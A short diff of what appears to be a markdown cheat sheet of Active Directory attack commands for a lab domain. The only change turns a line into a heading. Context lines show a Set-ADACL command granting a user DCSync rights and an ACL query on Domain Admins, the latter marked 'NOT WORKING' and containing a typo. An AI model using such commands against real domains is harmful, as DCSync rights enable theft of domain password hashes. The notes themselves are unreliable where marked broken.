@@ -293,7 +293,7 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 
 ```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
 
-Check ACLs:
+#### Check ACLs
 NOT WORKING!!
 ```Get-ObjectAcl -SamAccountName "Domain Admins" - ResolveGUIDs | ?{$_.IdentityReference -match 'Josh'}```
 DCSync (not working): 
